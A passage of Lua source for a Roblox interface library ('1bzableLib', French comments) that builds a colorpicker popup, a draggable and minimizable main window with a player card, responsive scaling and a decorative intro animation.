            safeCallback(config.Callback, key)
        end
    end)
    if config.Flag then Library.Flags[config.Flag] = api end
    render()
    return api
end

function TabMethods:AddColorpicker(config)
    config = config or {}

    local value =
        typeof(config.Default) == "Color3"
        and config.Default
        or Library.Theme.Accent

    local frame = self:_card(46)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 0),
        Size = UDim2.new(1, -75, 1, 0),
        Text = config.Name or "Colorpicker",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    local swatch = new("TextButton", {
        AutoButtonColor = false,
        BackgroundColor3 = value,
        BorderSizePixel = 0,
        Position = UDim2.new(1, -54, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5),
        Size = UDim2.new(0, 40, 0, 28),
        Text = "",
        ZIndex = 10,
        Parent = frame,
    })

    addCorner(swatch, 6)
    addStroke(swatch, Color3.new(1, 1, 1), 1, 0.65)

    ----------------------------------------------------------------
    -- POPUP FLOTTANT
    ----------------------------------------------------------------

    local popup = new("Frame", {
        Name = "ColorpickerPopup",
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Visible = false,
        ZIndex = 2000,
        Size = UDim2.fromOffset(245, 285),
        Parent = makePopupHost(self.Window),
    })

    addCorner(popup, 9)
    addStroke(popup, Library.Theme.Stroke, 1, 0)
    self.Window.ColorpickerPopups = self.Window.ColorpickerPopups or {}
    table.insert(self.Window.ColorpickerPopups, popup)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.fromOffset(12, 8),
        Size = UDim2.new(1, -24, 0, 20),
        Text = config.Name or "Choisir une couleur",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        ZIndex = 2001,
        Parent = popup,
    })

    ----------------------------------------------------------------
    -- SATURATION / VALEUR
    ----------------------------------------------------------------

    local sv = new("Frame", {
        BackgroundColor3 = Color3.fromHSV(0, 1, 1),
        BorderSizePixel = 0,
        Position = UDim2.fromOffset(12, 34),
        Size = UDim2.fromOffset(185, 185),
        ZIndex = 2001,
        Parent = popup,
    })

    addCorner(sv, 7)

    -- Blanc -> couleur
    local whiteGradient = new("UIGradient", {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)),
            ColorSequenceKeypoint.new(1, Color3.new(1, 1, 1)),
        }),
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0),
            NumberSequenceKeypoint.new(1, 1),
        }),
        Rotation = 0,
        Parent = sv,
    })

    -- Noir -> transparent
    local blackOverlay = new("Frame", {
        BackgroundColor3 = Color3.new(0, 0, 0),
        BackgroundTransparency = 0,
        BorderSizePixel = 0,
        Size = UDim2.fromScale(1, 1),
        ZIndex = 2002,
        Parent = sv,
    })

    addCorner(blackOverlay, 7)

    local blackGradient = new("UIGradient", {
        Rotation = 90,
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.new(0, 0, 0)),
            ColorSequenceKeypoint.new(1, Color3.new(0, 0, 0)),
        }),
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(1, 0),
        }),
        Parent = blackOverlay,
    })

    ----------------------------------------------------------------
    -- CURSEUR SV
    ----------------------------------------------------------------

    local svCursor = new("Frame", {
        BackgroundColor3 = Color3.new(1, 1, 1),
        BorderSizePixel = 0,
        Size = UDim2.fromOffset(12, 12),
        AnchorPoint = Vector2.new(0.5, 0.5),
        ZIndex = 2005,
        Parent = sv,
    })

    addCorner(svCursor, 6)
    addStroke(svCursor, Color3.new(0, 0, 0), 1, 0.15)

    ----------------------------------------------------------------
    -- BARRE HUE
    ----------------------------------------------------------------

    local hueBar = new("Frame", {
        BackgroundColor3 = Color3.new(1, 1, 1),
        BorderSizePixel = 0,
        Position = UDim2.fromOffset(208, 34),
        Size = UDim2.fromOffset(22, 185),
        ZIndex = 2001,
        Parent = popup,
    })

    addCorner(hueBar, 7)

    local hueGradient = new("UIGradient", {
        Rotation = 90,
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)),
            ColorSequenceKeypoint.new(0.16, Color3.fromRGB(255, 255, 0)),
            ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0)),
            ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 255, 255)),
            ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 0, 255)),
            ColorSequenceKeypoint.new(0.83, Color3.fromRGB(255, 0, 255)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 0)),
        }),
        Parent = hueBar,
    })

    local hueCursor = new("Frame", {
        BackgroundColor3 = Color3.new(1, 1, 1),
        BorderSizePixel = 0,
        Size = UDim2.new(1, 4, 0, 8),
        Position = UDim2.new(-0.5, 0, 0, 0),
        AnchorPoint = Vector2.new(0.5, 0.5),
        ZIndex = 2005,
        Parent = hueBar,
    })

    addCorner(hueCursor, 4)
    addStroke(hueCursor, Color3.new(0, 0, 0), 1, 0.15)

    ----------------------------------------------------------------
    -- PREVIEW
    ----------------------------------------------------------------

    local preview = new("Frame", {
        BackgroundColor3 = value,
        BorderSizePixel = 0,
        Position = UDim2.fromOffset(12, 231),
        Size = UDim2.fromOffset(218, 32),
        ZIndex = 2001,
        Parent = popup,
    })

    addCorner(preview, 6)
    addStroke(preview, Library.Theme.Stroke, 1, 0.1)

    ----------------------------------------------------------------
    -- ETAT HSV
    ----------------------------------------------------------------

    local h, s, v = Color3.toHSV(value)

    local api = {
        Value = value,
        Type = "Colorpicker",
    }

    local function render()
        local hueColor = Color3.fromHSV(h, 1, 1)

        sv.BackgroundColor3 = hueColor
        preview.BackgroundColor3 = Color3.fromHSV(h, s, v)
        swatch.BackgroundColor3 = Color3.fromHSV(h, s, v)

        svCursor.Position = UDim2.new(
            s,
            0,
            1 - v,
            0
        )

        hueCursor.Position = UDim2.new(
            -0.5,
            0,
            h,
            0
        )
    end

    local function emit()
        local color = Color3.fromHSV(h, s, v)

        api.Value = color
        preview.BackgroundColor3 = color
        swatch.BackgroundColor3 = color

        safeCallback(config.Callback, color)
    end

    function api:Set(color)
        if typeof(color) ~= "Color3" then
            return
        end

        h, s, v = Color3.toHSV(color)
        api.Value = color
        render()
        safeCallback(config.Callback, color)
    end

    ----------------------------------------------------------------
    -- CALCUL SV
    ----------------------------------------------------------------

    local draggingSV = false
    local draggingHue = false

    local function updateSV(mouseX, mouseY)
        local size = sv.AbsoluteSize
        if size.X <= 0 or size.Y <= 0 then
            return
        end

        local px = math.clamp(
            (mouseX - sv.AbsolutePosition.X) / size.X,
            0,
            1
        )

        local py = math.clamp(
            (mouseY - sv.AbsolutePosition.Y) / size.Y,
            0,
            1
        )

        s = px
        v = 1 - py

        render()
        emit()
    end

    local function updateHue(mouseY)
        local size = hueBar.AbsoluteSize
        if size.Y <= 0 then
            return
        end

        h = math.clamp(
            (mouseY - hueBar.AbsolutePosition.Y) / size.Y,
            0,
            1
        )

        render()
        emit()
    end

    connect(sv.InputBegan, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingSV = true
            updateSV(input.Position.X, input.Position.Y)
        end
    end)

    connect(hueBar.InputBegan, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingHue = true
            updateHue(input.Position.Y)
        end
    end)

    connect(UserInputService.InputChanged, function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then
            return
        end

        if draggingSV then
            updateSV(input.Position.X, input.Position.Y)
        end

        if draggingHue then
            updateHue(input.Position.Y)
        end
    end)

    connect(UserInputService.InputEnded, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            draggingSV = false
            draggingHue = false
        end
    end)

    ----------------------------------------------------------------
    -- POSITIONNEMENT DU POPUP
    ----------------------------------------------------------------

    local function positionPopup()
        if not popup.Visible then
            return
        end

        local root = self.Window.Gui

        local rootPos = root.AbsolutePosition
        local rootSize = root.AbsoluteSize

        local swatchPos = swatch.AbsolutePosition
        local swatchSize = swatch.AbsoluteSize

        local popupSize = popup.AbsoluteSize

        local x =
            swatchPos.X
            - rootPos.X
            + swatchSize.X
            - popupSize.X

        local y =
            swatchPos.Y
            - rootPos.Y
            + swatchSize.Y
            + 6

        if x < 8 then
            x = 8
        end

        if x + popupSize.X > rootSize.X - 8 then
            x = rootSize.X - popupSize.X - 8
        end

        if y + popupSize.Y > rootSize.Y - 8 then
            y = swatchPos.Y - rootPos.Y - popupSize.Y - 6
        end

        if y < 8 then
            y = 8
        end

        popup.Position = UDim2.fromOffset(x, y)
    end

    ----------------------------------------------------------------
    -- OUVERTURE / FERMETURE
    ----------------------------------------------------------------

    connect(swatch.Activated, function()
        local newState = not popup.Visible

        -- Ferme les autres dropdown/popup.
        for _, other in ipairs(self.Window.Dropdowns or {}) do
            if other ~= popup and other.Parent then
                other.Visible = false
            end
        end

        popup.Visible = newState

        if popup.Visible then
            render()

            task.defer(function()
                if popup.Visible then
                    positionPopup()
                end
            end)
        end
    end)

    connect(UserInputService.InputEnded, function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1 then
            return
        end

        if not popup.Visible then
            return
        end

        task.defer(function()
            if not popup.Visible then
                return
            end

            local mouse = UserInputService:GetMouseLocation()

            local popupPos = popup.AbsolutePosition
            local popupSize = popup.AbsoluteSize

            local swatchPos = swatch.AbsolutePosition
            local swatchSize = swatch.AbsoluteSize

            local insidePopup =
                mouse.X >= popupPos.X
                and mouse.X <= popupPos.X + popupSize.X
                and mouse.Y >= popupPos.Y
                and mouse.Y <= popupPos.Y + popupSize.Y

            local insideSwatch =
                mouse.X >= swatchPos.X
                and mouse.X <= swatchPos.X + swatchSize.X
                and mouse.Y >= swatchPos.Y
                and mouse.Y <= swatchPos.Y + swatchSize.Y

            if not insidePopup and not insideSwatch then
                popup.Visible = false
            end
        end)
    end)

    connect(self.Window.Gui:GetPropertyChangedSignal("AbsolutePosition"), function()
        if popup.Visible then
            positionPopup()
        end
    end)

    connect(self.Window.Gui:GetPropertyChangedSignal("AbsoluteSize"), function()
        if popup.Visible then
            positionPopup()
        end
    end)

    if config.Flag then
        Library.Flags[config.Flag] = api
    end

    api:Set(value)

    return api
end

--========================================================--
-- Window
--========================================================--

function Library:IsRunning()
    for _, window in ipairs(self.Windows) do
        if not window.Destroyed and window.Gui and window.Gui.Parent then
            return true
        end
    end
    return false
end

local function getMinimizedDimensions(window)
    local style = window.MinimizeStyle or "Barre"
    return style == "Barre" and 250 or 58, style == "Barre" and 48 or 58
end

local function offsetUDim2(position, x, y)
    return UDim2.new(position.X.Scale, position.X.Offset + x, position.Y.Scale, position.Y.Offset + y)
end

local function getMinimizedPosition(window, normalPosition)
    normalPosition = normalPosition or window.NormalPosition or window.Main.Position
    local width, height = getMinimizedDimensions(window)
    local scale = window.ScaleFactor or 1
    local normalWidth = (window.NormalSize and window.NormalSize.X.Offset) or 680
    local normalHeight = (window.NormalSize and window.NormalSize.Y.Offset) or 410
    local mode = window.MinimizePositionMode or "Coin supérieur gauche"
    local dx, dy = 0, 0
    if mode == "Centre de la fenêtre" then
        dx = ((normalWidth - width) * 0.5) * scale
        dy = ((normalHeight - height) * 0.5) * scale
    elseif mode == "Coin inférieur droit" then
        dx = (normalWidth - width) * scale
        dy = (normalHeight - height) * scale
    end
    return offsetUDim2(normalPosition, dx, dy)
end

local function getNormalPositionFromMinimized(window, minimizedPosition)
    local width, height = getMinimizedDimensions(window)
    local scale = window.ScaleFactor or 1
    local normalWidth = (window.NormalSize and window.NormalSize.X.Offset) or 680
    local normalHeight = (window.NormalSize and window.NormalSize.Y.Offset) or 410
    local mode = window.MinimizePositionMode or "Coin supérieur gauche"
    local dx, dy = 0, 0
    if mode == "Centre de la fenêtre" then
        dx = ((normalWidth - width) * 0.5) * scale
        dy = ((normalHeight - height) * 0.5) * scale
    elseif mode == "Coin inférieur droit" then
        dx = (normalWidth - width) * scale
        dy = (normalHeight - height) * scale
    end
    return offsetUDim2(minimizedPosition, -dx, -dy)
end

function Library:MakeWindow(config)
    config = config or {}
    Library.MenuName = tostring(config.Name or "1bzableLib")
    if type(config.WebhookConfig) == "table" then
        self:ConfigureWebhook(config.WebhookConfig)
    end

    -- Attente facultative de l'état chargé du jeu avant de construire l'interface.
    if config.WaitForGameLoaded ~= false then
        local deadline = os.clock() + 20
        while not game:IsLoaded() and os.clock() < deadline do
            task.wait(0.1)
        end
    end

    destroyExistingGui()

    local gui = new("ScreenGui", {
        Name = "1bzableLib",
        ResetOnSpawn = false,
        IgnoreGuiInset = true,
        ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
    })
    gui.Parent = getGuiParent()

    local main = new("Frame", {
        BackgroundColor3 = Library.Theme.Main,
        BackgroundTransparency = Library.Settings.BackgroundTransparency,
        BorderSizePixel = 0,
        Position = UDim2.new(0.5, -340, 0.5, -205),
        Size = UDim2.new(0, 680, 0, 410),
        Parent = gui,
    })
    local responsiveScale = new("UIScale", {Scale = 1, Parent = main})
    addCorner(main, 11)
    addStroke(main, Library.Theme.Stroke, 1, 0.1)

    local top = new("Frame", {
        BackgroundColor3 = Library.Theme.Second,
        BackgroundTransparency = Library.Settings.BackgroundTransparency,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 0, 48),
        Active = true,
        Parent = main,
    })
    addCorner(top, 11)

    local windowTitle = new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 16, 0, 0),
        Size = UDim2.new(1, -160, 1, 0),
        Text = config.Name or "1bzableLib",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBlack,
        TextSize = 17,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = top,
    })

    local minimize = new("TextButton", {
        AutoButtonColor = false,
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Position = UDim2.new(1, -74, 0, 9),
        Size = UDim2.new(0, 28, 0, 28),
        Text = "−",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 18,
        Parent = top,
    })
    addCorner(minimize, 6)

    local reloadButton = new("TextButton", {
        Name = "ReloadMenuButton",
        AutoButtonColor = false,
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Position = UDim2.new(1, -108, 0, 9),
        Size = UDim2.fromOffset(28, 28),
        Text = "↻",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 18,
        Parent = top,
    })
    addCorner(reloadButton, 6)

    local close = new("TextButton", {
        AutoButtonColor = false,
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Position = UDim2.new(1, -40, 0, 9),
        Size = UDim2.new(0, 28, 0, 28),
        Text = "×",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 17,
        Parent = top,
    })
    addCorner(close, 6)

    local minimizeAvatar = new("ImageButton", {
        Name = "MinimizeAvatar",
        AutoButtonColor = false,
        BackgroundColor3 = Library.Theme.Main,
        BackgroundTransparency = 0,
        BorderSizePixel = 0,
        Position = UDim2.new(0.5, -23, 0.5, -23),
        Size = UDim2.fromOffset(46, 46),
        Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(LocalPlayer.UserId) .. "&w=150&h=150",
        Visible = false,
        ZIndex = 10,
        Parent = top,
    })
    addCorner(minimizeAvatar, 23)
    addStroke(minimizeAvatar, Library.Theme.Accent, 2, 0.1)

    local sidebar = new("Frame", {
        BackgroundColor3 = Library.Theme.Second,
        BackgroundTransparency = Library.Settings.BackgroundTransparency,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 0, 0, 48),
        Size = UDim2.new(0, 165, 1, -48),
        Parent = main,
    })

    local tabList = new("ScrollingFrame", {
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 0, 0, 7),
        Size = UDim2.new(1, 0, 1, -80),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        CanvasSize = UDim2.new(),
        ScrollingEnabled = true,
        Active = true,
        ElasticBehavior = Enum.ElasticBehavior.WhenScrollable,
        ScrollBarThickness = UserInputService.TouchEnabled and 2 or 3,
        ScrollBarImageColor3 = Library.Theme.Divider,
        Parent = sidebar,
    })

    new("UIListLayout", {
        Padding = UDim.new(0, 6),
        SortOrder = Enum.SortOrder.LayoutOrder,
        Parent = tabList,
    })

    new("UIPadding", {
        PaddingLeft = UDim.new(0, 8),
        PaddingRight = UDim.new(0, 8),
        Parent = tabList,
    })

    local contentHolder = new("Frame", {
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 165, 0, 48),
        Size = UDim2.new(1, -165, 1, -48),
        Parent = main,
    })

    -- Le panneau latéral laisse visible l'arrondi inférieur gauche du panneau principal.
    addCorner(sidebar, 11)
    local sidebarCornerPatches = {}
    for _, corner in ipairs({
        {Position = UDim2.new(0, 0, 0, 0)},
        {Position = UDim2.new(1, -11, 0, 0)},
        {Position = UDim2.new(1, -11, 1, -11)},
    }) do
        table.insert(sidebarCornerPatches, new("Frame", {
            BackgroundColor3 = Library.Theme.Second,
            BorderSizePixel = 0,
            Position = corner.Position,
            Size = UDim2.fromOffset(11, 11),
            Parent = sidebar,
        }))
    end

    -- Bottom-left LocalPlayer card.
    local playerCard = new("Frame", {
        BackgroundColor3 = Library.Theme.Main,
        BackgroundTransparency = Library.Settings.BackgroundTransparency,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 8, 1, -67),
        Size = UDim2.new(1, -16, 0, 54),
        Parent = sidebar,
    })
    addCorner(playerCard, 7)
    addStroke(playerCard, Library.Theme.Stroke, 1, 0.3)

    local profileAvatar = new("ImageLabel", {
        BackgroundColor3 = Library.Theme.Second,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 7, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5),
        Size = UDim2.new(0, 38, 0, 38),
        Image = "rbxthumb://type=AvatarHeadShot&id="
            .. tostring(LocalPlayer.UserId)
            .. "&w=150&h=150",
        Parent = playerCard,
    })
    addCorner(profileAvatar, 19)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 53, 0, 7),
        Size = UDim2.new(1, -60, 0, 17),
        Text = LocalPlayer.DisplayName or LocalPlayer.Name,
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextTruncate = Enum.TextTruncate.AtEnd,
        Parent = playerCard,
    })

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 53, 0, 25),
        Size = UDim2.new(1, -60, 0, 15),
        Text = "@" .. LocalPlayer.Name,
        TextColor3 = Library.Theme.TextDark,
        Font = Enum.Font.Gotham,
        TextSize = 9,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextTruncate = Enum.TextTruncate.AtEnd,
        Parent = playerCard,
    })

    local window = setmetatable({
        Gui = gui,
        Main = main,
        Top = top,
        MinimizeButton = minimize,
        ReloadButton = reloadButton,
        CloseButton = close,
        MinimizeAvatar = minimizeAvatar,
        MinimizeStyle = (config.MinimizeStyle == "Carré" or config.MinimizeStyle == "Avatar") and config.MinimizeStyle or "Barre",
        MinimizePositionMode = config.MinimizePositionMode or "Coin supérieur gauche",
        NormalPosition = nil,
        PositionInitialized = false,
        SuppressControlActivationUntil = 0,
        Reloading = false,
        TitleLabel = windowTitle,
        ResponsiveScale = responsiveScale,
        ScaleFactor = 1,
        NormalSize = UDim2.fromOffset(680, 410),
        Sidebar = sidebar,
        SidebarCornerPatches = sidebarCornerPatches,
        TabList = tabList,
        ContentHolder = contentHolder,
        PlayerCard = playerCard,
        Tabs = {},
        Dropdowns = {},
        PopupHost = nil,
        Minimized = false,
        Destroyed = false,
    }, WindowMethods)

    table.insert(self.Windows, window)

    makePopupHost(window)

    -- Onglets intégrés ajoutés après ceux du créateur. UI reste le dernier onglet.
    task.defer(function()
        if not window.Destroyed then
            self:BuildLocalPlayerTab(window)
            self:BuildMiscTab(window)
            self:BuildUISettingsTab(window)
        end
    end)

    -- Mise à l'échelle responsive pour petits écrans (les ScrollingFrames restent tactiles).
    local function updateResponsiveScale()
        local camera = Workspace.CurrentCamera
        local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
        local scale = math.clamp(math.min(1, (viewport.X - 20) / 680, (viewport.Y - 20) / 410), 0.55, 1)
        window.ScaleFactor = scale
        responsiveScale.Scale = scale
        if not window.PositionInitialized then
            main.Position = UDim2.new(0.5, -340 * scale, 0.5, -205 * scale)
            window.NormalPosition = main.Position
            window.PositionInitialized = true
        elseif window.Minimized then
            main.Position = getMinimizedPosition(window, window.NormalPosition)
            local minimizedWidth, minimizedHeight = getMinimizedDimensions(window)
            main.Size = UDim2.fromOffset(minimizedWidth, minimizedHeight)
        else
            main.Position = window.NormalPosition or main.Position
        end
    end
    local viewportConnection
    local function bindCamera(camera)
        if viewportConnection then
            pcall(function() viewportConnection:Disconnect() end)
            viewportConnection = nil
        end
        if camera then
            viewportConnection = connect(camera:GetPropertyChangedSignal("ViewportSize"), updateResponsiveScale)
        end
        updateResponsiveScale()
    end
    bindCamera(Workspace.CurrentCamera)
    connect(Workspace:GetPropertyChangedSignal("CurrentCamera"), function()
        bindCamera(Workspace.CurrentCamera)
    end)

    -- RightControl minimise/restaure l'interface, sauf lorsqu'un champ texte est actif.
    connect(UserInputService.InputBegan, function(input, gameProcessed)
        if input.KeyCode ~= Enum.KeyCode.RightControl then return end
        if UserInputService:GetFocusedTextBox() then return end
        if gameProcessed and not UserInputService:GetFocusedTextBox() then
            -- Le raccourci reste utilisable même si Roblox marque l'entrée comme traitée.
        end
        window:ToggleMinimize()
    end)

    -- Dragging : le bandeau ET le contrôle réduit (carré/avatar) servent de prise.
    -- Un simple clic restaure/minimise; un mouvement supérieur à 4 px est traité comme un drag.
    do
        local dragging = false
        local dragStart = nil
        local startPos = nil
        local dragInputType = nil
        local didDrag = false

        local function beginDrag(input)
            if dragging then return end
            if input.UserInputType ~= Enum.UserInputType.MouseButton1
                and input.UserInputType ~= Enum.UserInputType.Touch then
                return
            end
            dragging = true
            didDrag = false
            dragStart = input.Position
            startPos = main.Position
            dragInputType = input.UserInputType
        end

        local function moveDrag(input)
            if not dragging then return end
            local allowedMove = (dragInputType == Enum.UserInputType.MouseButton1 and input.UserInputType == Enum.UserInputType.MouseMovement)
                or (dragInputType == Enum.UserInputType.Touch and input.UserInputType == Enum.UserInputType.Touch)
            if not allowedMove then return end

            local delta = input.Position - dragStart
            if not didDrag and delta.Magnitude < 4 then return end
            didDrag = true
            main.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end

        local function endDrag(input)
            if not dragging then return end
            local matchesEnd = (dragInputType == Enum.UserInputType.MouseButton1 and input.UserInputType == Enum.UserInputType.MouseButton1)
                or (dragInputType == Enum.UserInputType.Touch and input.UserInputType == Enum.UserInputType.Touch)
            if not matchesEnd then return end

            dragging = false
            if didDrag then
                window.SuppressControlActivationUntil = os.clock() + 0.20
                if window.Minimized then
                    window.NormalPosition = getNormalPositionFromMinimized(window, main.Position)
                else
                    window.NormalPosition = main.Position
                end
            end
            dragStart, startPos, dragInputType = nil, nil, nil
            didDrag = false
        end

        connect(top.InputBegan, beginDrag)
        connect(minimize.InputBegan, beginDrag)
        connect(reloadButton.InputBegan, beginDrag)
        connect(minimizeAvatar.InputBegan, beginDrag)
        connect(UserInputService.InputChanged, moveDrag)
        connect(UserInputService.InputEnded, endDrag)
    end

    connect(minimize.Activated, function()
        if os.clock() < (window.SuppressControlActivationUntil or 0) then return end
        window:ToggleMinimize()
    end)
    connect(minimizeAvatar.Activated, function()
        if os.clock() < (window.SuppressControlActivationUntil or 0) then return end
        if window.Minimized then window:Restore() end
    end)
    connect(reloadButton.MouseEnter, function()
        TweenService:Create(reloadButton, TweenInfo.new(0.10), {BackgroundColor3 = Library.Theme.Third}):Play()
    end)
    connect(reloadButton.MouseLeave, function()
        TweenService:Create(reloadButton, TweenInfo.new(0.10), {BackgroundColor3 = Library.Theme.Main}):Play()
    end)
    connect(reloadButton.Activated, function()
        if os.clock() < (window.SuppressControlActivationUntil or 0) then return end
        window:Reload()
    end)
    connect(close.MouseEnter, function()
        TweenService:Create(close, TweenInfo.new(0.10), {BackgroundColor3 = Color3.fromRGB(150, 45, 55)}):Play()
    end)
    connect(close.MouseLeave, function()
        TweenService:Create(close, TweenInfo.new(0.10), {BackgroundColor3 = Library.Theme.Main}):Play()
    end)
    connect(minimize.MouseEnter, function()
        TweenService:Create(minimize, TweenInfo.new(0.10), {BackgroundColor3 = Library.Theme.Third}):Play()
    end)
    connect(minimize.MouseLeave, function()
        TweenService:Create(minimize, TweenInfo.new(0.10), {BackgroundColor3 = Library.Theme.Main}):Play()
    end)
    connect(close.Activated, function()
        window:Destroy()
    end)

    -- Intro courte et décorative : l'UI est déjà construite, ce n'est pas un faux indicateur de chargement.
    if config.Intro ~= false then
        local intro = new("Frame", {
            Name = "IntroOverlay",
            BackgroundColor3 = Library.Theme.Main,
            BackgroundTransparency = 0,
            BorderSizePixel = 0,
            Size = UDim2.fromScale(1, 1),
            ClipsDescendants = true,
            ZIndex = 100,
            Parent = main,
        })
        addCorner(intro, 11)
        local introTitle = new("TextLabel", {
            BackgroundTransparency = 1,
            Position = UDim2.new(0, 20, 0.5, -34),
            Size = UDim2.new(1, -40, 0, 28),
            Text = Library.MenuName,
            TextColor3 = Library.Theme.Text,
            TextTransparency = 0,
            Font = Enum.Font.GothamBlack,
            TextSize = 22,
            TextXAlignment = Enum.TextXAlignment.Center,
            TextTruncate = Enum.TextTruncate.AtEnd,
            TextWrapped = false,
            ZIndex = 101,
            Parent = intro,
        })
        local introSubtitle = new("TextLabel", {
            BackgroundTransparency = 1,
            Position = UDim2.new(0, 20, 0.5, -3),
            Size = UDim2.new(1, -40, 0, 18),
            Text = "Initialisation de l'interface",
            TextColor3 = Library.Theme.TextDark,
            TextTransparency = 0,
            Font = Enum.Font.Gotham,
            TextSize = 11,
            TextXAlignment = Enum.TextXAlignment.Center,
            TextTruncate = Enum.TextTruncate.AtEnd,
            TextWrapped = false,
            ZIndex = 101,
            Parent = intro,
        })
        local introTrack = new("Frame", {
            BackgroundColor3 = Library.Theme.Divider,
            BorderSizePixel = 0,
            Position = UDim2.new(0.20, 0, 0.5, 28),
            Size = UDim2.new(0.60, 0, 0, 4),
            ZIndex = 101,
            Parent = intro,
        })
        addCorner(introTrack, 3)
        local introFill = new("Frame", {
            BackgroundColor3 = Library.Theme.Accent,
            BorderSizePixel = 0,
            Size = UDim2.new(0, 0, 1, 0),
            ZIndex = 102,
            Parent = introTrack,
        })
        addCorner(introFill, 3)
        -- Intro décorative (l'UI est déjà construite à ce stade). Les durées 2 s et + sont respectées.
        local introDuration = math.clamp(tonumber(config.IntroDuration) or 2.4, 0.5, 5)
        TweenService:Create(introFill, TweenInfo.new(introDuration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
            Size = UDim2.new(1, 0, 1, 0),
        }):Play()
        task.delay(introDuration, function()
            if intro and intro.Parent then
                TweenService:Create(intro, TweenInfo.new(0.20, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                    BackgroundTransparency = 1,
                }):Play()
                for _, descendant in ipairs(intro:GetDescendants()) do
                    if descendant:IsA("TextLabel") then
                        TweenService:Create(descendant, TweenInfo.new(0.20), {TextTransparency = 1}):Play()
                    elseif descendant:IsA("Frame") then
                        TweenService:Create(descendant, TweenInfo.new(0.20), {BackgroundTransparency = 1}):Play()
                    end
                end
                task.delay(0.23, function() if intro and intro.Parent then intro:Destroy() end end)
            end
        end)
    end

    -- Fade-in.
    do
        local targetMainTransparency = main.BackgroundTransparency

        main.BackgroundTransparency = 1

        TweenService:Create(
            main,
            TweenInfo.new(Library.Settings.FadeTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {BackgroundTransparency = targetMainTransparency}
        ):Play()
    end

    applyBlur()

    return window
end

local function animateMinimizeIcon(window, minimized)
    local button = window.MinimizeButton
    if not button or not button.Parent then return end
    TweenService:Create(button, TweenInfo.new(0.09, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
        Rotation = 90,
        TextTransparency = 1,
    }):Play()
    task.delay(0.09, function()
        if not button or not button.Parent then return end
        button.Text = minimized and "+" or "−"
        button.Rotation = -90
        TweenService:Create(button, TweenInfo.new(0.13, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Rotation = 0,
            TextTransparency = 0,
        }):Play()
    end)
end

local function applyMinimizeAppearance(window, minimized)
    local top = window.Top
    local title = window.TitleLabel
    local minimize = window.MinimizeButton
    local reload = window.ReloadButton
    local close = window.CloseButton
    local avatar = window.MinimizeAvatar
    if not (top and minimize and reload and close and title and avatar) then return end

    if not minimized then
        top.Size = UDim2.new(1, 0, 0, 48)
        title.Visible = true
        title.Position = UDim2.new(0, 16, 0, 0)
        title.Size = UDim2.new(1, -160, 1, 0)
        reload.Visible = true
        reload.Position = UDim2.new(1, -108, 0, 9)
        reload.Size = UDim2.fromOffset(28, 28)
        minimize.Visible = true
        minimize.Position = UDim2.new(1, -74, 0, 9)
        minimize.Size = UDim2.fromOffset(28, 28)
